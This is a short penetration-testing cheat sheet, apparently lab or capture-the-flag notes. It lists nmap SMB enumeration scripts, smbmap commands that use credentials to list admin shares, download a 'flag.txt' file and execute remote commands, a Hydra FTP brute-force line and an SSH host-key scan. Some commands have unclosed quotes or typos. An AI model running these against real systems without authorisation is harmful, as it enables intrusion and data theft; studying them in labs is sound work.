**NMAP scripts**

```nmap -p445 --script smb-protocols (IP Address)```

```nmap -p445 --script smb-security-mode (IP Address)```

```nmap -p445 --script smb-enum-sessions (IP Address)```

```nmap -p445 --script smb-enum-shares (IP Address)```

```nmap -p445 --script smb-enum-domains (IP Address)```

```nmap -p445 --script smb-enum-groups (IP Address)```

```nmap -p445 --script smb-enum-services (IP Address)```

```nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=(username),smbpassword=(password) (IP Address)```

IPC$ is useful. It is an anonymous session. It allows guest access.

**SMBMap**

Show permissions for user

```smbmap -u "(username)" -p "(password)" -H "(IP address)```

List out contents of drive

```smbmap -H (Ip address) -u (username) -p (password) -r C$```

Downloading file using SMB Map

```smbmap -u administrator -p smbserver_771 -H 10.4.244.255 --download "c$\flag.txt```

Executing a command

```smbmap -H (Ip address) -u (username) -p (password) -x 'command' ---command example-IPconfig```

**Brute forcing FTP using Hydra
**

```hydra -L (Username list) -P (Password list) (IP Address) ftp```

**SSH - Getting SSH host key using Nmap
**

```nmap (IPaddress) -p 22 --script-args ssh_hostkey=full```
Save the host key for later
